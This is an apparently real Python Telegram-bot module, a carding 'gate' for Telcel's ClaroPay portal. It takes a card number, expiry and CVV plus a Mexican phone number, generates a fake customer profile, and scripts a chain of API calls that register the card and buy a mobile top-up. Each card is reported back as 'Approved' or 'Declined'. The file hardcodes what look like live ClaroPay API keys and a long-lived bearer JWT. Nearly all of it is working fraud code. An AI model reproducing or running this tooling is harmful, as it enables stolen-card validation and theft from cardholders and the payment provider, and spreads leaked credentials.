...
# ══════════════════════════════════════════════════════════════════════════
# Usage: /zb CC|MM|YY|CVV phone [monto]
# phone: Telcel MX 10 digits (required)
# monto: 10, 20, 30, 50, 80, 100, 150, 200, 300, 500 (keyboard if omitted)
...
def _zb_kbd(bot, card_s=None, phone=None):
    if card_s and phone:
        flat = [bot.addButton(f"{e} ${a}", callback=f"zb_monto {a}|{card_s}|{phone}") for a, e in _ZB_KBD_MONTOS]
    else:
        flat = [bot.addButton(f"{e} ${a}", callback=f"zb_monto {a}") for a, e in _ZB_KBD_MONTOS]
...
_T1_JWT = (
    "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiI0IiwianRpIjoiZjNhM2I4MjMwMWI1"
    "NzcyZDVmYjk2MThkZWZhNTZkY2M3ZmUxNDcwNDE1MzA0YTU5ZjIxNDgyOTBlZjZkMjgxNTM1MGRi"
    "YTY1OWQ3NzMzYzgiLCJpYXQiOjE3NzY3Mjc4MDQuMDA4MDMsIm5iZiI6MTc3NjcyNzgwNC4wMDgw"
    "MzIsImV4cCI6MTgzOTg4NjIwNC4wMDM5MDYsInN1YiI6IjcxIiwic2NvcGVzIjpbImNsaWVudGUt"
    "dGFyamV0YXMiLCJjbGllbnRlLWNsaWVudGVzIl19.kKYlWwJSK_ImR5mNtbHFKxzAnBK2srW6zMV"
    "xOmhrcET4L99yRWuXEnMLU_yHJThJtnCvlKeLhH9X5FfUOA1thdqdEXneYDpQabBuOn5lC7mgpZbs"
    "q6JSKs7hZ3PJabMTAkDalaTrBhlGehFU4P_VMlWSGo6EBuBs1-5c7IO-nevbJ9bMtDFB33CPAIGVs"
    "KQlefgxkAe70sP-vUP5r2uv0QaUiWS3PdOJ0UGwYYUlp0rDX54xNj9BH-2PfvsSxi99l-jzJ30_t"
    "opOlpRlFGkld6xeJn_k7iH4M5FSk0EfcTedbMn6QCZtyh6k4UahWLLnk_aH8_BwkzUsr1PZaz8szD"
    "R5lP_s43-NgC8-Po41f3tJsmtB9L8pN3TYzF9Vpd4E2Gj321HLi1q2wwRgZnadAmlPq6_GyDzUkRf"
    "m0_J6nh7C21OFUnAn2sakCV_8SC6_vwHm2EhITNuFOauAlYwXyx6BttIUsPbm6U4QwPWg_YYZOkc_"
    "dnQ-YduUUSipsTwujB68ZFwbX8JB-bg9y_0ILsNhwoRtd98h3AUGff_oeYnhPKUt5VRwqKBpU9xhf"
    "x7-tQV5zVQU_jgPud9Y9FGTlE1nQsX6QQ9oi6gyKbb0df9JBvBr0_nZBxCYs0R5uRTwV7drIfexz"
    "FUtKAIK6RCrwWidbvWuE3fGEUtnOojhaeg"
)

_API_KEYS = {
    "portal":     "gzvLzMHmJ9a0wyi2v2nJSaIa3KUfExtP7Qy7rN8I",
    "userinfo":   "osMTzNopOYHcdzTiZgZGNoIkZZFUyoRnOcxsrJeE",
    "profile":    "l4bWfF3rrS6nKv21UjW2U3Lfin0PCRuE2nJacVGP",
    "cardmgmt":   "S3rHhMdo391x1SUJ32uAy9LBc0CFZPqh8TGjoZi3",
    "commission": "DgZNQ7eYRj1LU9THB6z7g1V4pUXSJRXuaMmvJYiR",
}

_MONTOS = {
    "10":  ("266", "Recarga $10",  7),
    "20":  ("236", "Recarga $20",  10),
    "30":  ("267", "Recarga $30",  15),
    "50":  ("238", "Recarga $50",  30),
    "80":  ("268", "Recarga $80",  30),
    "100": ("239", "Recarga $100", 60),
    "150": ("240", "Recarga $150", 60),
    "200": ("241", "Recarga $200", 60),
    "300": ("242", "Recarga $300", 60),
    "500": ("243", "Recarga $500", 60),
}
...
class Utility:
    ...
    def generateFakeProfile() -> types.SimpleNamespace:
        ...
        return types.SimpleNamespace(
            ...
            mail=f"{firstName}.{lastName}{random.randint(0,999)}@gmail.com",
        )

    @staticmethod
    def parseCard(raw: str) -> dict:
        num, month, year, cvv = re.split(r'[\s|/]+', raw.strip())
        year4 = year if len(year) == 4 else f"20{year}"
        return {
            'number': num, 'month': month.zfill(2), 'year4': year4,
            'year2': year4[-2:], 'cvv': cvv, 'bin': num[:6], 'last4': num[-4:],
            'expDate': month.zfill(2) + year4[-2:],
            'mark': Utility._MARK_MAP.get(num[0], "2"),
            'brand': Utility._BRAND_MAP.get(num[0], "mastercard"),
        }

    @staticmethod
    def buildPhoneData(raw: str) -> str:
        digits = re.sub(r"\D", "", str(raw)).removeprefix("00").removeprefix("52")
        if len(digits) != 10:
...
def processTelcel(cardInput: str, phone: str = None, monto: str = "10", proxy=None, retries: int = 0) -> dict:
    ...
    try:
        headers1 = {'Accept': 'application/json, text/plain, */*', 'x-api-key': _API_KEYS["portal"],
                    'cp-bi': 'com.claropay.web.portalpagos', 'Origin': 'https://pay.telcel.com',
        ...
        # token viene cifrado: salt|iv|ct -> descifrarlo a JSON con tokensDTO.access_token (firebase JWT)
        decrypted = Utility.decryptPayload(cipher_data)
        act_json  = json.loads(decrypted)
        firebase_jwt = act_json["tokensDTO"]["access_token"]

        headers2 = {'Accept': '*/*', 'Accept-Language': 'es-ES,es;q=0.9',
                    'Origin': 'https://pay.telcel.com', 'Referer': 'https://pay.telcel.com/',
                    'Content-Type': 'application/json', 'x-api-key': _API_KEYS["userinfo"],
        ...
        headers3           = {'Accept': '*/*', 'Accept-Language': 'es-ES,es;q=0.9',
                              'Origin': 'https://pay.telcel.com', 'Referer': 'https://pay.telcel.com/',
                              'Content-Type': 'application/json', 'x-api-key': _API_KEYS["profile"],
                              'Authorization': f'Bearer {firebase_jwt}'}
        ...
        if not customer_id:
            headers4    = {'Accept': '*/*', 'Authorization': f'Bearer {_T1_JWT}',
                           'Content-Type': 'application/json', 'Origin': 'https://pay.telcel.com',
                           'Referer': 'https://pay.telcel.com/'}
        ...
        headers5 = {'Accept': '*/*', 'Authorization': f'Bearer {_T1_JWT}',
                    'Content-Type': 'application/json', 'Origin': 'https://pay.telcel.com',
                    'Referer': 'https://pay.telcel.com/'}
        payload5 = {'cargo_unico': False, 'cvv2': card["cvv"], 'default': False,
                    'expiracion_anio': card["year2"], 'expiracion_mes': card["month"],
                    'nombre': data.name, 'pan': card["number"], 'cliente_id': customer_id}
        ...
        headers6 = {'Accept': '*/*', 'Accept-Language': 'es-ES,es;q=0.9',
                    'Origin': 'https://pay.telcel.com', 'Referer': 'https://pay.telcel.com/',
                    'Content-Type': 'application/json', 'x-api-key': _API_KEYS["profile"],
                    'Authorization': f'Bearer {firebase_jwt}', 'cp-bi': 'pay.telcel.com',
                    'cp-bv': '4.110.103', 'cp-so': 'web'}
        payload6 = {'email': f"cp-0000000000-{uuid.uuid4()}@claropay.com",
                    'customer': {'claroId': claro_id, 'personId': claro_id,
                                 'processor': 't1pagos', 'customerId': customer_id}}
        model.post('https://api.claropay.com/claroid/profile/cardCustomer', headers=headers6, json=payload6)

        headers7 = {'Accept': '*/*', 'Accept-Language': 'es-ES,es;q=0.9',
                    'Origin': 'https://pay.telcel.com', 'Referer': 'https://pay.telcel.com/',
                    'Content-Type': 'application/json', 'x-api-key': _API_KEYS["cardmgmt"],
                    'Authorization': f'Bearer {firebase_jwt}', 'cp-bi': 'pay.telcel.com',
                    'cp-bv': '4.110.103', 'cp-so': 'web'}
        payload7 = {'msisdn': '0000000000', 'externalId': str(uuid.uuid4()),
                    'card': {'tokens': [{'platform': '1', 'value': card_token}],
                             'expirationDate': card["expDate"], 'lastDigits': card["last4"],
                             'bin': card["bin"], 'mark': card["mark"], 'acceptTermsAndConditions': True},
                    'deviceData': None, 'canDeviceData': False, 'latitude': '0.0', 'longitude': '0.0',
                    'appVersion': '1.0', 'claroId': claro_id, 'name': data.name,
                    'isDefault': '0', 'cardName': ''}
        ...
        payload8  = {'appVersion': '1.0', 'externalId': str(uuid.uuid4()), 'claroId': claro_id,
                     'latitude': '0.0', 'longitude': '0.0', 'msisdn': '0000000000'}
        ...
        headers9  = {'Accept': '*/*', 'Accept-Language': 'es-ES,es;q=0.9',
                     'Origin': 'https://pay.telcel.com', 'Referer': 'https://pay.telcel.com/',
                     'Content-Type': 'application/json', 'x-api-key': _API_KEYS["commission"],
                     'Authorization': f'Bearer {firebase_jwt}', 'cp-bi': 'pay.telcel.com'}
        payload9  = {'serviceId': '143', 'merchantId': '', 'amount': monto, 'isClaroPay': 'false',
                     'cardId': card_id, 'appVersion': '4.110.103', 'isClaroPartner': 'false'}
        ...
        headers11 = {'Accept': '*/*', 'Accept-Language': 'es-ES,es;q=0.9',
                     'Origin': 'https://pay.telcel.com', 'Referer': 'https://pay.telcel.com/',
                     'Content-Type': 'application/json', 'x-api-key': _API_KEYS["cardmgmt"],
                     'Authorization': f'Bearer {firebase_jwt}'}
        payload11 = {'appVersion': '4.70.908', 'externalId': str(uuid.uuid4()),
                     'latitude': '0.0', 'longitude': '0.0', 'msisdn': '0000000000'}
        ...
        sc_merged = {**{k: v for k, v in sc_card_data.items() if k not in ("bin", "msisdn")},
                     "bins": sc_card_data.get("bin", card["bin"]), "cvv": card["cvv"]}
        try:
        ...
        payload12 = json.dumps({
            "accountHolder": {"accountCreateWebSessionID": "", "accountCreationDate": creation_date,
                              "accountHolderAddress": {"city": "", "countryCodeId": "484", "externalNumber": "", "internalNumber": "", "postalCode": "", "region": "", "street": "", "suburb": ""},
                              "birthdate": "", "card": sc_merged, "firstName": "", "governmentId": {"idNumber": "", "idType": "2"}, "lastName": "", "secondLastName": ""},
            "appVersion": "1.0", "checkPayment": True, "claroId": claro_id, "clientIdT1": customer_id,
            "destinationAccountId": number, "deviceFingerprint": f"_0000000000_{secrets.token_hex(16)}_{ts_ms}",
            "externalId": str(uuid.uuid4()), "inquiryTelmexId": "", "isClaroSocio": False,
            "latitude": "0.0", "longitude": "0.0", "makePayment": True, "msisdn": "0000000000",
            "paymentChannel": 7, "paymentDescription": "Pago desde portal telcel", "paymentRoute": "1",
            "productId": product_id, "serviceId": "143", "serviceName": "Telcel",
            "sessionId": session_id, "totalAmount": str(monto), "totalCommission": "0",
        }, separators=(",", ":"))
        headers12 = {'Accept': '*/*', 'Accept-Language': 'es-ES,es;q=0.9',
                     'Origin': 'https://pay.telcel.com', 'Referer': 'https://pay.telcel.com/',
                     'Content-Type': 'application/json', 'x-api-key': _API_KEYS["portal"],
                     'Authorization': f'Bearer {firebase_jwt}', 'cp-bi': 'pay.telcel.com',
                     'cp-bv': '4.110.103', 'cp-so': 'web'}
        request12 = model.post('https://api.claropay.com/be-portal-pagos/portalPagosRest/t1Payment',
                               headers=headers12, json={"data": Utility.encryptPayload(payload12)})
        r12      = request12.json()
        ...
        if code == 0:
            return {'status': True, 'success': True, 'card': card_str, 'response': 'TRANSACCION_EXITOSA',
                    'apiResponse': 'Approved ✅', 'retries': retries, 'messageType': msg_type,
                    'product': product, 'gateway': _GATEWAY}
        else:
            return {'status': True, 'success': False, 'card': card_str,
                    'response': msg or 'GENERIC_DECLINE', 'apiResponse': 'Declined ❌',
                    'retries': retries, 'messageType': msg_type, 'product': product, 'gateway': _GATEWAY}

    except Exception as Error:
        if retries <= 3:
            return processTelcel(cardInput, phone, monto, proxy, retries + 1)
        card_str = f"{card['number']}|{card['month']}|{card['year4']}|{card['cvv']}"
        return {'status': True, 'success': False, 'card': card_str, 'response': str(Error)[:200],
                'apiResponse': 'Max Retries ❌', 'retries': retries, 'gateway': _GATEWAY}
...
def gateCmd(bot, update, gestion):
    ...
    if not card_s:
        return bot.replyMessage(text=(
            f"{bot.bi('Telcel ClaroPay')} [ 🍹 ]\n{DIV}\n"
            f"🍹 {bot.bi('Use')}: <code>/zb cc|mm|yy|cvv numero</code>\n"
            f"💳 {bot.bi('Ejemplo')}: <code>/zb 4111111111111111|12|26|123 5548448605</code>"
        ))

    if not phone:
        return bot.replyMessage(text=(
            f"{bot.bi('Wrong Data')} [ ⚠️ ]\n"
            f"🍹 {bot.bi('Raise')}: <code>Use: /zb cc|mm|yy|cvv numero</code>"
        ))
    ...
    if not monto:
        return bot.replyMessage(
            ...
            reply_markup=_zb_kbd(bot, card_s=card_s, phone=phone)
        )
...
def zb_monto_cb(bot, update, gestion):
    ...
    if monto not in _MONTOS or not card_s or not phone:
        return bot.showAlert('Sesión expirada, usa /zb de nuevo', update.query_id, True)

    bot.showAlert(f'${monto} MXN seleccionado', update.query_id, False)

    bot.cmd = types.SimpleNamespace(command='zb', args=card_s)
